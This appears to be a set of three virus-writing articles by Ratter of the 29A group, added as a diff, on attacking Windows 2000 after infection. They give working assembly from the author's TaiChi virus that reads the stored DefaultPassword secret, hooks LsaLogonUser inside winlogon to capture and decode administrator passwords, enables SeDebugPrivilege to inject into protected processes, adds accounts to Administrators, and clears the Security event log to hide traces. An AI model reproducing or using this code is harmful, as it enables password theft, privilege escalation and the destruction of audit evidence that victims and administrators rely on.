@@ -1,0 +1,497 @@
+
+컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[PASSWORDS.TXT]컴�
+			      .Gaining passwords.
+				.by Ratter/29A.
+
+
+.Intro.
+If you read my article about impersonation you've probably noticed that for
+have it working you need the account name and the password. It ain't a big
+problem to retrieve the account name. The problem is to gain the password of
+course. Here I'll present some ideas how to steal the passwords ...
+
+
+.The easier one.
+Maybe you're lazy as me and don't want to login everytime you turn on your
+machine. Thatswhy you have the option to let the system log the default user
+which you have set. For the lazy people like me the best solution :) However
+where is stored the default user's password?
+
+Of course in the SAM. However if you have the admin privileges it's very easy
+to gain it from there. Have a look at code snippet again :)
+
+- Retrieving DefaultPassword -
+;-----------------------------------------------------------------------------
+; Lsa* apis are exported by advapi32.dll
+
+key_name	dw	name_length
+		dw	name_length
+		dd	offset _name_
+_name_		dw	"D", "e", "f", "a", "u", "l", "t", "P", "a", "s", \
+			"s", "w", "o", "r", "d"
+name_length	equ	$-_name_
+
+
+        @pushvar <policy_handle	dd	?>
+	push 1
+	call $+5+6*4
+		dd	6*4
+		dd	5 dup(?)
+	push 0
+	calle LsaOpenPolicy
+        
+        @pushvar <private_data	dd	?>
+        push offset key_name
+	push dword ptr [policy_handle]
+	calle LsaRetrievePrivateData
+
+        mov eax, dword ptr [private_data]	; now in eax ptr to an UNICODE string
+	xchg eax, ecx
+	jecxz next
+						; which contains the DefaultPassword
+	push eax
+	mov eax, dword ptr [eax+4]		; now in eax the *DefaultPassword
+
+	push eax
+	calle LsaFreeMemory
+	calle LsaFreeMemory
+
+	push dword ptr [policy_handle]
+	calle LsaClose
+;-----------------------------------------------------------------------------
+
+This was easy right? However it can be used in very limited cases. Let's have
+a look at the second method.
+
+
+.The Trojan method.
+While coding TaiChi I've learned a lot of things about Win2k. First of all it
+of course were the NTFS structures and the NTFS organization in whole. Secondly
+it was a lot of things about security and also about the logon process ...
+
+If you see that naughty dialog box while login to the system you've probably
+also thought about "hey this can't be hard to hook and log all those passwords!".
+And you we're right. It really ain't hard. All you need is some info about
+how the logon process works and to know what to hook/patch ...
+
+Winlogon is the component which handles the logon (the name gives a lil clue
+right? :)). Since we have learned how to modify/patch winlogon we know a way
+how to implant our hook code there. But what to hook?
+
+Winlogon relies on Graphical Identification and Authentication (GINA) dll
+which is responsible for retrieving user name and password. The default GINA
+is Msgina.dll which brings us that naughty dialog box :). So msgina is the 
+to start. I've coded a little winlogon replacement (well it's more a wrapper)
+which you can find in binaries dir. This helped me to track what's happening
+with the retrieved password and user name (the first place to hook could be
+msgina.dll - the place where it retrieves the password from the dialog box;
+however this is not the best place because user could write it badly and we
+wouldn't know it ...). I realised that msgina (after encrypting it via 
+RtlRunEncodeUnicodeString) sends user and password to the LsaLogonUser api
+(which is in fact just a wrapper which via LPC communicates with lsass.exe
+process) which is exported by secur32.dll. This is the right place to hook
+because we have even the NTSTATUS on return so we know whether it was good
+or badly writen - ie whether the user was logged in or not.
+
+And this is exactly what I did. I hooked the LsaLogonUser api at the end (to
+know the exit status) and all admin password I've logged to registry. I think
+it's time for a code snippet from TaiChi :) I won't teach you how to hook a
+function because you all know it of course. I'll just show you the hook
+routine ...
+
+- LsaLogonUser Hook -
+;-----------------------------------------------------------------------------
+lsa_logon_user_hook	proc	near
+	pop esi
+        leave
+
+	test eax, eax				; the user logged successfully?
+	jnz lsa_logon_user_hook_end_
+
+	pushad
+	@SEH_SetupFrame <jmp lsa_logon_user_hook_end>
+
+	@gimme_delta
+
+	mov esi, dword ptr [esp+8+cPushad+4+16]	; AuthenticationInformation
+
+	cmp dword ptr [esi], 2			; InteractiveLogon ?
+	jnz lsa_logon_user_hook_end
+
+	@pushvar <net_buf_ptr	dd	?>
+	push 1
+	push dword ptr [esi+16]			; retrieve user info
+	push 0
+	call dword ptr [ebp+end_remote_routine+tNetUserGetInfo]
+	test eax, eax
+	jnz lsa_logon_user_hook_end
+
+	mov eax, dword ptr [ebp+net_buf_ptr]
+	push dword ptr [eax+12]
+
+        push eax
+        call dword ptr [ebp+end_remote_routine+tNetApiBufferFree]
+
+        pop eax
+        cmp eax, USER_PRIV_ADMIN		; does user belong to admin group?
+        jnz lsa_logon_user_hook_end
+
+	mov ebx, dword ptr [esp+8+cPushad+4+20]	; AuthenticationInformationLength  
+	mov ecx, ebx
+	add ecx, 300
+
+	push ecx
+	push GMEM_ZEROINIT			; alloc some memory
+	call dword ptr [ebp+end_remote_routine+tGlobalAlloc]
+	test eax, eax
+	jz lsa_logon_user_hook_end
+	xchg eax, edi
+
+	pushad
+	mov ecx, ebx
+	rep movsb				; copy there AuthenticationInfo
+	popad
+
+	mov eax, dword ptr [esi+24]
+	sub eax, esi
+	add eax, edi				; get the password
+	mov dword ptr [edi+24], eax		; in encrypted form
+
+        movzx eax, byte ptr [edi+21]
+	xor byte ptr [edi+21], al
+	lea edx, [edi+20]
+	push edx				; decode the password
+	push eax
+	call dword ptr [ebp+end_remote_routine+tRtlRunDecodeUnicodeString]
+
+	push edi
+	mov edx, esi
+	mov ecx, edi
+	xor eax, eax
+
+	lea edi, [edi+ebx]
+	mov esi, dword ptr [edx+16]
+	@unicode_to_asciiz
+
+	mov dword ptr [ebp+value_data], edi
+
+	mov esi, dword ptr [ecx+24]
+        mov edx, edi
+	@unicode_to_asciiz
+	sub edi, edx
+	mov edx, edi
+        pop edi
+
+        ; ok we've got an admin account so store it to registry ...
+        push edx
+        @pushvar <reg_handle	dd	?>
+        @pushsz "Software\29A\TaiChi"
+        push HKEY_LOCAL_MACHINE			; store user/password pair to
+        call dword ptr [ebp+end_remote_routine+tRegCreateKeyA]
+        pop edx					; registry
+        test eax, eax
+        jnz lsa_logon_free_mem
+
+        push edx
+        push 12346578h
+value_data	equ	$-4
+	push REG_SZ
+	push eax
+	lea eax, [edi+ebx]
+	push eax
+	mov ebx, dword ptr [ebp+reg_handle]
+	push ebx
+        call dword ptr [ebp+end_remote_routine+tRegSetValueExA]
+
+	push ebx
+        call dword ptr [ebp+end_remote_routine+tRegCloseKey]
+lsa_logon_free_mem:
+	push edi
+	call dword ptr [ebp++end_remote_routine+tGlobalFree]
+lsa_logon_user_hook_end:
+        @SEH_RemoveFrame
+	popad					; and finally end ... :)
+lsa_logon_user_hook_end_:
+	retn 38h
+lsa_logon_user_hook	endp
+;-----------------------------------------------------------------------------
+
+
+.Closing.
+There are some other ways to retrieve passwords. You don't have to infect
+winlogon of course :) As i said the LsaLogonUser is just a wrapper to
+lsass.exe process. So the next step is to infect lsass.exe process. Since
+it is the main security handling process of the system possibilities are
+obvious. And everytime you can try to crack the passwords in the SAM databases
+using brute force of course :)) This I'll let upon you ...
+
+
+--
+Ratter/29A - I'm a stranger in the world I haven't made.
+컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[PASSWORDS.TXT]컴�
+컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[WINLOGON.TXT]컴�
+			     .Infecting Winlogon.
+				.by Ratter/29A.
+
+.Intro.
+You've probably tried to open winlogon process via OpenProcess api with desired
+access to write. And you've probably failed :) Why? Winlogon is one of the
+main Win32 subsystem components and thus is protected from other user-mode
+processes to modify him. As other components runs with the system privileges
+and thatswhy he's very interesting for us.
+
+Imagine a situation:
+Your virus is runned under normal user security context, but yet you're allowed
+to modify winlogon. What does it mean for you (except that you can turn off
+the sfp and install a password trojan :))? Everything runned in the winlogon
+process (ie also your remote thread) is runned under the system privileges
+which are equal to administrators ones. So put everything admin-neede in your
+virus to a remote thread in winlogon and you'll win :)
+
+So the key question is. How to make the system to let you modify winlogon and
+other win32 subsystems? Afaik there are two user-mode ways to achieve it.
+
+.Gflags technique.
+Win2k has a set of systemwide global flags that can allow various internal
+debugging, tracing and other functionality. In the kernel there is a variable
+called NtGlobalFlag which is initialized every boot from the registry key
+HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\GlobalFlag. If you
+have NTDDK go to the bin directory and run gflags.exe. This program changes
+this key to achieve the functionality ...
+
+There also exist two flags which affect debugging (ie writing :)) to the Win32
+subsystem/winlogon. These two are "Debug Win32 subsystem" and
+"Debug Win32 subsystem". If you want to enable them or the GlobalFlag key
+with the 420000h value. You of course need to restart the system to have it
+working. That's all ...
+
+This tech was used the famous GetAdmin tool. This progie used the kernel mode bug
+in AddAtom function to modify the NtGlobalFlag variable to let modify winlogon.
+Then it runned the remote thread under the context of winlogon and added current
+user to the administrator group. It really worked however the bug is fixed under
+Win2k/XP.
+
+.The SeDebugPrivilege approach.
+This approach worx with the SeDebugPrivilege privilege. This has to be assigned
+to account in which context you're running under. Defaultly this privilege have
+only members of administrator group. Thus once runned as admin add this privilege
+to Everyone group and the first step will be done.
+
+When this has been done, we can go further. Now we have to enable this privilege
+because defaultly it is disabled. This sample code from my Win2k.TaiChi shows
+you how to do it ...
+
+- Enabling SeDebugPrivilege -
+;-----------------------------------------------------------------------------
+; All used apis are exported by advapi32.dll
+
+        SE_PRIVILEGE_ENABLED		equ	02h
+
+TOKEN_PRIVILEGES	struc
+	TP_count	dd	?
+	TP_luid		dq	?
+	TP_attribz	dd	?
+TOKEN_PRIVILEGES	ends
+
+
+        ....
+        push SE_PRIVILEGE_ENABLED
+	pop eax
+        @pushsz "SeDebugPrivilege"
+	pop esi
+	call touch_privilege
+	jz infect_winlogon_end
+	....
+
+
+touch_privilege:
+	mov ebx, ebp
+touch_privilege_	proc	near
+	local	process_token:DWORD
+	local	privilege_luid:QWORD
+	local	token_privilegez:TOKEN_PRIVILEGES
+
+	pushad
+	@SEH_SetupFrame <jmp touch_privilege_end>
+
+	xchg eax, edi
+
+	call dword ptr [ebx+tGetCurrentProcess]
+	lea edx, [process_token]
+	push edx
+	push TOKEN_ADJUST_PRIVILEGES
+	push eax
+	call dword ptr [ebx+tOpenProcessToken]
+	dec eax
+	jnz touch_privilege_end
+
+	lea edx, [token_privilegez.TP_luid]
+	push edx
+	push esi
+	push eax
+	call dword ptr [ebx+tLookupPrivilegeValueA]
+	dec eax
+	jnz touch_privilege_close_p_token
+
+	push eax
+	push eax
+	push type(TOKEN_PRIVILEGES)
+	lea edx, [token_privilegez]
+
+	push 1
+	pop dword ptr [edx]
+	mov dword ptr [edx.TP_attribz], edi
+
+	push edx
+	push eax
+	push dword ptr [process_token]
+	call dword ptr [ebx+tAdjustTokenPrivileges]
+
+touch_privilege_close_p_token:
+	push eax
+	push dword ptr [process_token]
+	call dword ptr [ebx+tCloseHandle]
+	pop eax
+touch_privilege_end:
+	@SEH_RemoveFrame
+	mov dword ptr [esp.Pushad_eax], eax
+	popad
+	leave
+	retn
+touch_privilege_	endp
+;-----------------------------------------------------------------------------
+
+The snippet above simply "adjusts" your privileges and from now you're finally
+allowed to modify what you want :)
+
+
+.Debugger users.
+Simply add the accoung to Debugger users group :) This should work too, however
+i haven't tested it so I'm not 100% sure. Test it if you want and lemme know :)
+
+
+.Closing.
+Don't forget that not only winlogon could be the victim. Exampli gratia the 
+lsass.exe the main security component of the whole system (even kernel mode
+security functions work via LPC with this process) could be also modified.
+Just reverse engineer and exploit what you'll find ...
+
+--
+Ratter/29A - I'm a stranger in the world I haven't made.
+컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[WINLOGON.TXT]컴�
+컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[OPENINGNT.TXT]컴�
+	      .Opening NT boxes for you and your comrades in arms.
+				.by Ratter/29A.
+
+.Intro.
+You have infected a NT box and you're runned under the administrators group
+member security context. Now you can do everything you want with the machine.
+How to make the machine open for you even if you log in as a normal user?
+
+
+.Adding to administrators group.
+Of course you can add now every account to administrators group. It's probably
+the easiest way to achieve the full control of the machine everytime your virus
+is runned. However this is not very "stealth" because even the stupidiest admin
+worx with accounts and almost for sure will see it.
+
+- Adding account to an administrators group -
+;-----------------------------------------------------------------------------
+; Apis are exported by advapi32.dll and netapi32.dll
+
+	domain_name_buffer		db	100 dup(?)
+	sid_buffer			db	30 dup(?)
+
+        @pushvar <dd	?>			; SID_type
+	@pushvar <dd	100>			; domain_name_buffer size
+	push offset domain_name_buffer		; domain_name
+	@pushvar <dd	30>			; sid_buffer size
+	push offset sid_buffer			; on output - sid
+	@pushsz "account"			; account name
+	push 0					; system name - null is local system
+	calle LookupAccountNameA
+
+	push 1                         		; one entry
+	@pushvar <dd	offset sid_buffer>	; entry buffer
+	push 0					; entry type ...
+	call $+5+15*2				; group name
+	dw	"a", "d", "m", "i", "n", "i", "s", "t", "r", "a", "t", "o", "r", "s", 0
+	push 0					; local system
+        calle NetLocalGroupAddMembers
+;-----------------------------------------------------------------------------
+
+.Adding needed privileges for Impersonation/Debug mode.
+This approach is much more clever. I won't paste the code from TaiChi here
+in this case bacause it's too extensive so have a look to the source of
+Win2k.TaiChi function add_privilegez. What it does? First it gets the Everyone
+group SID and then adds both needed privileges to this group. SeTcbPrivilege
+for impersonation and SeDebugPrivilege for Win32 subsystem infection support.
+
+You can of course combinate both. If you'll use impersonation to achieve full
+control then don't forget to install a trojan or find another way to retrieve
+passwords. However if you'll use only Debug support then possibly better idea
+is to modify the Global Flags because it's a little bit more "stealth" :) Or
+you can code a NT kernel mode driver which would via IOCTL on demand modify
+NtGlobalFlag variable to let you infect the protected components.
+
+
+.Disabling auditing.
+If an admin is a good one has auditing on so those steps you did (adding
+privileges) got audited. It is good to disable auditing (see the function
+disable_auditing in TaiChi) so nothing gets logged ...
+
+
+.Clearing the security event log.
+This is the log where auditing messages are stored. After you disable them
+it's good to clear this one. See code snippet:
+
+- Clearing the security event log -
+;-----------------------------------------------------------------------------
+; Used apis are exported by advapi32.dll
+
+        ...
+        @pushsz "Security"
+	pop esi
+	call clear_event_log
+	...
+
+clear_event_log	proc	near
+	pushad
+	@SEH_SetupFrame <jmp clear_event_log_end>
+
+        push esi
+	push 0
+	call dword ptr [ebp+tOpenEventLogA]
+	test eax, eax
+	jz clear_event_log_end
+	xchg eax, ebx
+
+	push 0
+	push ebx
+	call dword ptr [ebp+tClearEventLogA]
+
+	push ebx
+	call dword ptr [ebp+tCloseEventLog]
+clear_event_log_end:
+	@SEH_RemoveFrame
+	popad
+	retn
+clear_event_log	endp
+;-----------------------------------------------------------------------------
+
+Although the message "Event log cleared" will appear, it will hide your previous
+steps and for the admin it will be harder to trace you. And of course this
+log can be cleared totally by using for example NTFS direct access.
+
+
+.Closing.
+If you make these steps the NT box is opened for everyone. Once logged in
+you can do what you want. Even if you don't plan to write NT viruses at least
+add to your babes a code for adding SeDebugPrivilege to Everyone. Then it makes
+for another viruses easier to infect the machine - remember your fellow coders
+too :)))
+
+
+--
+Ratter/29A - I'm a stranger in the world I haven't made.
+컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[OPENINGNT.TXT]컴�
